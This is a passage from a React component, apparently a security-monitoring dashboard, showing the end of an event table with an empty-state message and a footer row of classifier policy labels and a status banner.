              ) : (
                <tr>
                  <td colSpan={6} className="p-8 text-center text-emerald-600/70 py-12">
                    <div className="flex flex-col items-center justify-center gap-2">
                      <HelpCircle className="w-8 h-8 text-[#059669]" />
                      <span className="text-sm font-bold block">No events logged matching active filters.</span>
                      <span className="text-xs">Adjust search query parameters or run active adversary scenarios above.</span>
                    </div>
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        {/* Dynamic Interactive Stats summary row */}
        <div className="flex flex-col sm:flex-row justify-between items-center bg-slate-950/40 border border-[#064e3b]/50 rounded-lg p-3 text-[10px] text-emerald-600 font-mono mt-3 text-center sm:text-left gap-2 sm:gap-0">
          <div>
            FORENSIC CLASSIFIER POLICIES: <strong>COM_RECON_T1</strong> | <strong>COM_SCAN_T2</strong> | <strong>COM_MAL_T3</strong>
          </div>
          <div>
            STRIKE CLASSIFICATION CORRELATION ENGINE: <strong className="text-emerald-400">ACTIVE [100.00% SYNC]</strong>
          </div>
        </div>
      </div>

    </div>
  );
}
